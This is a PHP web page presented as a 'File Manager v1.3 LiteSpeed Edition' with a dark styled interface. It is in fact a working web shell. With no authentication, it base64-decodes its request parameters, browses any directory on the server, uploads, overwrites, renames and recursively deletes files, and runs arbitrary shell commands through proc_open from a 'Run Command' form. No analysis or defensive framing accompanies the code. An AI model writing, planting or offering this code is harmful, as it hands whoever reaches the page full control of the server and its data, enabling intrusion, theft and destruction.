<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Manager</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-primary: #0f172a;
            --bg-secondary: #1e293b;
            --bg-tertiary: #334155;
            --text-primary: #f8fafc;
            --text-secondary: #cbd5e1;
            --accent-blue: #3b82f6;
            --accent-green: #10b981;
            --accent-red: #ef4444;
            --accent-yellow: #f59e0b;
            --border-color: #475569;
            --shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.3);
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', sans-serif;
        }
        
        body {
            background-color: var(--bg-primary);
            color: var(--text-primary);
            line-height: 1.6;
            font-size: 14px;
            padding-bottom: 40px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        
        /* Header */
        .header {
            text-align: center;
            margin-bottom: 30px;
            padding-bottom: 20px;
            border-bottom: 1px solid var(--border-color);
        }
        
        .header h1 {
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 5px;
        }
        
        .header p {
            color: var(--text-secondary);
            font-size: 14px;
            font-style: italic;
        }
        
        .server-info {
            background-color: var(--bg-secondary);
            padding: 12px 16px;
            border-radius: 6px;
            margin-top: 15px;
            font-size: 13px;
        }
        
        /* Breadcrumb */
        .breadcrumb {
            background-color: var(--bg-secondary);
            padding: 12px 16px;
            border-radius: 6px;
            margin-bottom: 20px;
            font-size: 13px;
        }
        
        .breadcrumb a {
            color: var(--accent-blue);
            text-decoration: none;
            transition: color 0.2s;
        }
        
        .breadcrumb a:hover {
            color: #60a5fa;
        }
        
        .breadcrumb .home-link {
            color: var(--accent-green);
            font-weight: 500;
        }
        
        /* Action Buttons */
        .actions {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
            gap: 12px;
            margin-bottom: 25px;
        }
        
        @media (max-width: 768px) {
            .actions {
                grid-template-columns: repeat(2, 1fr);
            }
        }
        
        @media (max-width: 480px) {
            .actions {
                grid-template-columns: 1fr;
            }
        }
        
        .action-btn {
            padding: 12px;
            border: none;
            border-radius: 6px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            text-align: center;
            font-size: 14px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        
        .action-btn:hover {
            transform: translateY(-2px);
            box-shadow: var(--shadow);
        }
        
        .action-btn.create-folder {
            background-color: var(--accent-green);
            color: white;
        }
        
        .action-btn.edit-file {
            background-color: var(--accent-blue);
            color: white;
        }
        
        .action-btn.upload-file {
            background-color: var(--accent-yellow);
            color: white;
        }
        
        .action-btn.run-command {
            background-color: var(--accent-red);
            color: white;
        }
        
        /* Command Result */
        .command-result {
            background-color: var(--bg-secondary);
            border-radius: 6px;
            margin-bottom: 25px;
            overflow: hidden;
        }
        
        .command-result p {
            padding: 12px 16px;
            background-color: var(--bg-tertiary);
            font-weight: 500;
        }
        
        .result-box {
            width: 100%;
            min-height: 200px;
            padding: 16px;
            background-color: var(--bg-secondary);
            color: var(--text-primary);
            border: none;
            font-family: monospace;
            font-size: 13px;
            resize: vertical;
        }
        
        /* File Table */
        .file-table-container {
            overflow-x: auto;
            border-radius: 6px;
            background-color: var(--bg-secondary);
            margin-bottom: 30px;
        }
        
        .file-table {
            width: 100%;
            border-collapse: collapse;
            min-width: 700px;
        }
        
        .file-table th {
            background-color: var(--bg-tertiary);
            padding: 14px 12px;
            text-align: left;
            font-weight: 600;
            font-size: 13px;
        }
        
        .file-table td {
            padding: 12px;
            border-top: 1px solid var(--border-color);
            font-size: 13px;
        }
        
        .file-table tr:hover {
            background-color: rgba(255, 255, 255, 0.05);
        }
        
        .file-link {
            color: var(--accent-blue);
            text-decoration: none;
            font-weight: 500;
        }
        
        .file-link:hover {
            text-decoration: underline;
        }
        
        .writable {
            background-color: rgba(59, 130, 246, 0.1);
        }
        
        /* Table buttons */
        .table-btn {
            padding: 8px 12px;
            border: none;
            border-radius: 4px;
            font-weight: 500;
            cursor: pointer;
            font-size: 12px;
            transition: opacity 0.2s;
            display: inline-block;
            text-align: center;
            width: 100%;
        }
        
        .table-btn:hover {
            opacity: 0.9;
        }
        
        .view-btn {
            background-color: var(--accent-blue);
            color: white;
        }
        
        .delete-btn {
            background-color: var(--accent-red);
            color: white;
        }
        
        .rename-btn {
            background-color: var(--accent-yellow);
            color: white;
        }
        
        /* Modal */
        .modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.7);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 1000;
        }
        
        .modal.active {
            display: flex;
        }
        
        .modal-content {
            background-color: var(--bg-secondary);
            border-radius: 8px;
            width: 90%;
            max-width: 500px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
            animation: modalFadeIn 0.3s;
        }
        
        @keyframes modalFadeIn {
            from {
                opacity: 0;
                transform: translateY(-20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .modal-header {
            padding: 18px 20px;
            border-bottom: 1px solid var(--border-color);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .modal-header h2 {
            font-size: 18px;
            font-weight: 600;
        }
        
        .close-btn {
            background: none;
            border: none;
            color: var(--text-secondary);
            font-size: 24px;
            cursor: pointer;
            line-height: 1;
            padding: 0;
            width: 30px;
            height: 30px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .close-btn:hover {
            color: var(--text-primary);
        }
        
        .modal-body {
            padding: 20px;
        }
        
        .form-group {
            margin-bottom: 16px;
        }
        
        .form-label {
            display: block;
            margin-bottom: 6px;
            font-weight: 500;
            font-size: 13px;
        }
        
        .form-input, .form-textarea {
            width: 100%;
            padding: 10px 12px;
            background-color: var(--bg-primary);
            border: 1px solid var(--border-color);
            border-radius: 4px;
            color: var(--text-primary);
            font-size: 14px;
        }
        
        .form-textarea {
            min-height: 120px;
            resize: vertical;
            font-family: monospace;
        }
        
        .modal-actions {
            display: flex;
            gap: 12px;
            margin-top: 20px;
        }
        
        .modal-btn {
            flex: 1;
            padding: 12px;
            border: none;
            border-radius: 4px;
            font-weight: 600;
            cursor: pointer;
            transition: opacity 0.2s;
        }
        
        .modal-btn:hover {
            opacity: 0.9;
        }
        
        .cancel-btn {
            background-color: var(--bg-tertiary);
            color: var(--text-primary);
        }
        
        .submit-btn {
            background-color: var(--accent-blue);
            color: white;
        }
        
        .rename-submit-btn {
            background-color: var(--accent-yellow);
            color: white;
        }
        
        /* Hidden form for rename */
        .rename-form {
            display: none;
        }
        
        /* Status Messages */
        .status-message {
            padding: 12px 16px;
            border-radius: 4px;
            margin-bottom: 20px;
            font-weight: 500;
        }
        
        .success {
            background-color: rgba(16, 185, 129, 0.2);
            color: var(--accent-green);
            border-left: 4px solid var(--accent-green);
        }
        
        .error {
            background-color: rgba(239, 68, 68, 0.2);
            color: var(--accent-red);
            border-left: 4px solid var(--accent-red);
        }
        
        /* Icons (using UTF-8 symbols) */
        .icon {
            font-size: 16px;
        }
        
        /* Footer */
        .footer {
            text-align: center;
            padding-top: 20px;
            margin-top: 30px;
            border-top: 1px solid var(--border-color);
            color: var(--text-secondary);
            font-size: 13px;
        }
    </style>
</head>
<body>
<div class="container">
    <?php
    $timezone = date_default_timezone_get();
    date_default_timezone_set($timezone);
    $rootDirectory = realpath($_SERVER['DOCUMENT_ROOT']);
    $scriptDirectory = dirname(__FILE__);

    function x($b) {
        return base64_encode($b);
    }

    function y($b) {
        return base64_decode($b);
    }

    foreach ($_GET as $c => $d) $_GET[$c] = y($d);

    $currentDirectory = realpath(isset($_GET['d']) ? $_GET['d'] : $rootDirectory);
    chdir($currentDirectory);

    $viewCommandResult = '';
    $statusMessage = '';

    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        if (isset($_FILES['fileToUpload'])) {
            $target_file = $currentDirectory . '/' . basename($_FILES["fileToUpload"]["name"]);
            if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
                $statusMessage = '<div class="status-message success">File "' . htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . '" uploaded successfully</div>';
            } else {
                $statusMessage = '<div class="status-message error">Error: Failed to upload file</div>';
            }
        } elseif (isset($_POST['folder_name']) && !empty($_POST['folder_name'])) {
            $newFolder = $currentDirectory . '/' . $_POST['folder_name'];
            if (!file_exists($newFolder)) {
                mkdir($newFolder);
                $statusMessage = '<div class="status-message success">Folder created successfully</div>';
            } else {
                $statusMessage = '<div class="status-message error">Error: Folder already exists</div>';
            }
        } elseif (isset($_POST['file_name']) && !empty($_POST['file_name'])) {
            $fileName = $_POST['file_name'];
            $newFile = $currentDirectory . '/' . $fileName;
            if (!file_exists($newFile)) {
                if (file_put_contents($newFile, $_POST['file_content']) !== false) {
                    $statusMessage = '<div class="status-message success">File created successfully</div>';
                } else {
                    $statusMessage = '<div class="status-message error">Error: Failed to create file</div>';
                }
            } else {
                if (file_put_contents($newFile, $_POST['file_content']) !== false) {
                    $statusMessage = '<div class="status-message success">File edited successfully</div>';
                } else {
                    $statusMessage = '<div class="status-message error">Error: Failed to edit file</div>';
                }
            }
        } elseif (isset($_POST['delete_file'])) {
            $fileToDelete = $currentDirectory . '/' . $_POST['delete_file'];
            if (file_exists($fileToDelete)) {
                if (is_dir($fileToDelete)) {
                    if (deleteDirectory($fileToDelete)) {
                        $statusMessage = '<div class="status-message success">Folder deleted successfully</div>';
                    } else {
                        $statusMessage = '<div class="status-message error">Error: Failed to delete folder</div>';
                    }
                } else {
                    if (unlink($fileToDelete)) {
                        $statusMessage = '<div class="status-message success">File deleted successfully</div>';
                    } else {
                        $statusMessage = '<div class="status-message error">Error: Failed to delete file</div>';
                    }
                }
            } else {
                $statusMessage = '<div class="status-message error">Error: File or directory not found</div>';
            }
        } elseif (isset($_POST['rename_item']) && isset($_POST['old_name']) && isset($_POST['new_name'])) {
            $oldName = $currentDirectory . '/' . $_POST['old_name'];
            $newName = $currentDirectory . '/' . $_POST['new_name'];
            if (file_exists($oldName)) {
                if (rename($oldName, $newName)) {
                    $statusMessage = '<div class="status-message success">"' . htmlspecialchars($_POST['old_name']) . '" renamed to "' . htmlspecialchars($_POST['new_name']) . '"</div>';
                } else {
                    $statusMessage = '<div class="status-message error">Error: Failed to rename item</div>';
                }
            } else {
                $statusMessage = '<div class="status-message error">Error: Item not found</div>';
            }
        } elseif (isset($_POST['cmd_input'])) {
            $command = $_POST['cmd_input'];
            $descriptorspec = [
                0 => ['pipe', 'r'],
                1 => ['pipe', 'w'],
                2 => ['pipe', 'w']
            ];
            $process = proc_open($command, $descriptorspec, $pipes);
            if (is_resource($process)) {
                $output = stream_get_contents($pipes[1]);
                $errors = stream_get_contents($pipes[2]);
                fclose($pipes[1]);
                fclose($pipes[2]);
                proc_close($process);
                if (!empty($errors)) {
                    $viewCommandResult = '<div class="command-result"><p>Command Result (Error Output):</p><textarea class="result-box" readonly>' . htmlspecialchars($errors) . '</textarea></div>';
                } else {
                    $viewCommandResult = '<div class="command-result"><p>Command Result:</p><textarea class="result-box" readonly>' . htmlspecialchars($output) . '</textarea></div>';
                }
            } else {
                $viewCommandResult = '<div class="status-message error">Error: Failed to execute command</div>';
            }
        } elseif (isset($_POST['view_file'])) {
            $fileToView = $currentDirectory . '/' . $_POST['view_file'];
            if (file_exists($fileToView)) {
                $fileContent = file_get_contents($fileToView);
                $viewCommandResult = '<div class="command-result"><p>Viewing: ' . $_POST['view_file'] . '</p><textarea class="result-box" readonly>' . htmlspecialchars($fileContent) . '</textarea></div>';
            } else {
                $viewCommandResult = '<div class="status-message error">Error: File not found</div>';
            }
        }
    }

    echo '<div class="header">';
    echo '<h1>File Manager</h1>';
    echo '<p>v.1.3 - LiteSpeed Edition</p>';
    echo '<div class="server-info">';
    echo '<p>Server Timezone: ' . $timezone . ' | Current Time: ' . date('Y-m-d H:i:s') . '</p>';
    echo '</div>';
    echo '</div>';
    
    echo $statusMessage;
    
    echo '<div class="breadcrumb">';
    echo 'Current Directory: ';
    
    $directories = explode(DIRECTORY_SEPARATOR, $currentDirectory);
    $currentPath = '';
    foreach ($directories as $index => $dir) {
        if ($dir === '') continue;
        $currentPath .= DIRECTORY_SEPARATOR . $dir;
        echo ' / <a href="?d=' . x($currentPath) . '">' . $dir . '</a>';
    }
    
    echo ' / <a href="?d=' . x($scriptDirectory) . '" class="home-link">[Home]</a>';
    echo '</div>';
    
    echo '<div class="actions">';
    echo '<button class="action-btn create-folder" onclick="openModal(\'createFolderModal\')"><span class="icon">📁</span> Create Folder</button>';
    echo '<button class="action-btn edit-file" onclick="openModal(\'createEditFileModal\')"><span class="icon">📄</span> Create / Edit File</button>';
    echo '<button class="action-btn upload-file" onclick="openModal(\'uploadFileModal\')"><span class="icon">⬆️</span> Upload File</button>';
    echo '<button class="action-btn run-command" onclick="openModal(\'runCommandModal\')"><span class="icon">⚡</span> Run Command</button>';
    echo '</div>';
    
    echo $viewCommandResult;
    
    echo '<div class="file-table-container">';
    echo '<table class="file-table">';
    echo '<thead>';
    echo '<tr>';
    echo '<th>Name</th>';
    echo '<th>Size</th>';
    echo '<th>Modified</th>';
    echo '<th>Permissions</th>';
    echo '<th>View</th>';
    echo '<th>Delete</th>';
    echo '<th>Rename</th>';
    echo '</tr>';
    echo '</thead>';
    echo '<tbody>';
    
    foreach (scandir($currentDirectory) as $v) {
        if ($v == '.' || $v == '..') continue;
        
        $u = realpath($v);
        $s = stat($u);
        $itemLink = is_dir($v) ? '?d=' . x($currentDirectory . '/' . $v) : '?d=' . x($currentDirectory) . '&f=' . x($v);
        $permission = substr(sprintf('%o', fileperms($u)), -4);
        $writable = is_writable($u);
        $rowClass = $writable ? 'writable' : '';
        
        echo '<tr class="' . $rowClass . '">';
        echo '<td><a href="' . $itemLink . '" class="file-link">' . $v . (is_dir($v) ? ' /' : '') . '</a></td>';
        echo '<td>' . (is_dir($v) ? '&lt;DIR&gt;' : formatFileSize(filesize($u))) . '</td>';
        echo '<td>' . date('Y-m-d H:i', filemtime($u)) . '</td>';
        echo '<td>' . $permission . '</td>';
        
        // View button
        echo '<td>';
        echo '<form method="post" class="table-form">';
        echo '<input type="hidden" name="view_file" value="' . htmlspecialchars($v) . '">';
        echo '<input type="submit" value="View" class="table-btn view-btn">';
        echo '</form>';
        echo '</td>';
        
        // Delete button
        echo '<td>';
        echo '<form method="post" onsubmit="return confirm(\'Delete ' . htmlspecialchars($v) . '?\')">';
        echo '<input type="hidden" name="delete_file" value="' . htmlspecialchars($v) . '">';
        echo '<input type="submit" value="Delete" class="table-btn delete-btn">';
        echo '</form>';
        echo '</td>';
        
        // Rename button (opens modal)
        echo '<td>';
        echo '<button onclick="openRenameModal(\'' . htmlspecialchars($v) . '\')" class="table-btn rename-btn">Rename</button>';
        echo '</td>';
        
        echo '</tr>';
    }
    
    echo '</tbody>';
    echo '</table>';
    echo '</div>';
    
    // Hidden form for rename
    echo '<form method="post" id="renameForm" class="rename-form">';
    echo '<input type="hidden" name="old_name" id="renameOldName">';
    echo '<input type="hidden" name="new_name" id="renameNewName">';
    echo '<input type="hidden" name="rename_item" value="1">';
    echo '</form>';
    
    function deleteDirectory($dir) {
        if (!file_exists($dir)) {
            return true;
        }
        if (!is_dir($dir)) {
            return unlink($dir);
        }
        foreach (scandir($dir) as $item) {
            if ($item == '.' || $item == '') {
                continue;
            }
            if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) {
                return false;
            }
        }
        return rmdir($dir);
    }
    
    function formatFileSize($bytes) {
        if ($bytes >= 1073741824) {
            return number_format($bytes / 1073741824, 2) . ' GB';
        } elseif ($bytes >= 1048576) {
            return number_format($bytes / 1048576, 2) . ' MB';
        } elseif ($bytes >= 1024) {
            return number_format($bytes / 1024, 2) . ' KB';
        } elseif ($bytes > 1) {
            return $bytes . ' bytes';
        } elseif ($bytes == 1) {
            return $bytes . ' byte';
        } else {
            return '0 bytes';
        }
    }
    ?>
    
    <div class="footer">
        <p>File Manager v1.3 | Server: <?php echo $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown'; ?></p>
    </div>
</div>

<!-- Create Folder Modal -->
<div id="createFolderModal" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            <h2>Create Folder</h2>
            <button class="close-btn" onclick="closeModal('createFolderModal')">&times;</button>
        </div>
        <div class="modal-body">
            <form method="post">
                <div class="form-group">
                    <label for="folder_name" class="form-label">Folder Name:</label>
                    <input type="text" id="folder_name" name="folder_name" class="form-input" placeholder="Enter folder name" required>
                </div>
                <div class="modal-actions">
                    <button type="button" class="modal-btn cancel-btn" onclick="closeModal('createFolderModal')">Cancel</button>
                    <button type="submit" class="modal-btn submit-btn">Create</button>
                </div>
            </form>
        </div>
    </div>
</div>

<!-- Create / Edit File Modal -->
<div id="createEditFileModal" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            <h2>Create / Edit File</h2>
            <button class="close-btn" onclick="closeModal('createEditFileModal')">&times;</button>
        </div>
        <div class="modal-body">
            <form method="post">
                <div class="form-group">
                    <label for="file_name" class="form-label">File Name:</label>
                    <input type="text" id="file_name" name="file_name" class="form-input" placeholder="Enter file name" required>
                </div>
                <div class="form-group">
                    <label for="file_content" class="form-label">File Content:</label>
                    <textarea id="file_content" name="file_content" class="form-textarea" placeholder="Enter file content"></textarea>
                </div>
                <div class="modal-actions">
                    <button type="button" class="modal-btn cancel-btn" onclick="closeModal('createEditFileModal')">Cancel</button>
                    <button type="submit" class="modal-btn submit-btn">Save</button>
                </div>
            </form>
        </div>
    </div>
</div>

<!-- Upload File Modal -->
<div id="uploadFileModal" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            <h2>Upload File</h2>
            <button class="close-btn" onclick="closeModal('uploadFileModal')">&times;</button>
        </div>
        <div class="modal-body">
            <form method="post" enctype="multipart/form-data">
                <div class="form-group">
                    <label for="fileToUpload" class="form-label">Select File:</label>
                    <input type="file" id="fileToUpload" name="fileToUpload" class="form-input" required>
                </div>
                <div class="modal-actions">
                    <button type="button" class="modal-btn cancel-btn" onclick="closeModal('uploadFileModal')">Cancel</button>
                    <button type="submit" name="submit" class="modal-btn submit-btn">Upload</button>
                </div>
            </form>
        </div>
    </div>
</div>

<!-- Run Command Modal -->
<div id="runCommandModal" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            <h2>Run Command</h2>
            <button class="close-btn" onclick="closeModal('runCommandModal')">&times;</button>
        </div>
        <div class="modal-body">
            <form method="post">
                <div class="form-group">
                    <label for="cmd_input" class="form-label">Command:</label>
                    <input type="text" id="cmd_input" name="cmd_input" class="form-input" placeholder="Enter command" required>
                </div>
                <div class="modal-actions">
                    <button type="button" class="modal-btn cancel-btn" onclick="closeModal('runCommandModal')">Cancel</button>
                    <button type="submit" class="modal-btn submit-btn">Run</button>
                </div>
            </form>
        </div>
    </div>
</div>

<!-- Rename Modal -->
<div id="renameModal" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            <h2>Rename Item</h2>
            <button class="close-btn" onclick="closeModal('renameModal')">&times;</button>
        </div>
        <div class="modal-body">
            <form id="renameModalForm" method="post">
                <div class="form-group">
                    <label for="renameOldNameDisplay" class="form-label">Current Name:</label>
                    <input type="text" id="renameOldNameDisplay" class="form-input" disabled>
                </div>
                <div class="form-group">
                    <label for="renameNewNameInput" class="form-label">New Name:</label>
                    <input type="text" id="renameNewNameInput" class="form-input" placeholder="Enter new name" required>
                </div>
                <div class="modal-actions">
                    <button type="button" class="modal-btn cancel-btn" onclick="closeModal('renameModal')">Cancel</button>
                    <button type="button" class="modal-btn rename-submit-btn" onclick="submitRename()">Rename</button>
                </div>
            </form>
        </div>
    </div>
</div>

<script>
    // Modal functions
    function openModal(modalId) {
        document.getElementById(modalId).classList.add('active');
    }

    function closeModal(modalId) {
        document.getElementById(modalId).classList.remove('active');
    }
    
    // Rename modal functions
    function openRenameModal(itemName) {
        document.getElementById('renameOldNameDisplay').value = itemName;
        document.getElementById('renameNewNameInput').value = itemName;
        document.getElementById('renameNewNameInput').focus();
        document.getElementById('renameNewNameInput').select();
        openModal('renameModal');
    }
    
    function submitRename() {
        const oldName = document.getElementById('renameOldNameDisplay').value;
        const newName = document.getElementById('renameNewNameInput').value;
        
        if (!newName || newName.trim() === '') {
            alert('Please enter a new name');
            return;
        }
        
        if (oldName === newName) {
            alert('New name must be different from current name');
            return;
        }
        
        // Set values in hidden form and submit
        document.getElementById('renameOldName').value = oldName;
        document.getElementById('renameNewName').value = newName;
        document.getElementById('renameForm').submit();
    }
    
    // Close modal when clicking outside
    window.onclick = function(event) {
        if (event.target.classList.contains('modal')) {
            event.target.classList.remove('active');
        }
    }
    
    // Close modal with Escape key
    document.addEventListener('keydown', function(event) {
        if (event.key === 'Escape') {
            const modals = document.querySelectorAll('.modal.active');
            modals.forEach(modal => {
                modal.classList.remove('active');
            });
        }
    });
    
    // Auto-focus first input in modal when opened
    document.addEventListener('DOMContentLoaded', function() {
        const modals = document.querySelectorAll('.modal');
        modals.forEach(modal => {
            modal.addEventListener('transitionend', function() {
                if (this.classList.contains('active')) {
                    const input = this.querySelector('.form-input');
                    if (input) input.focus();
                }
            });
        });
    });
</script>
</body>
</html>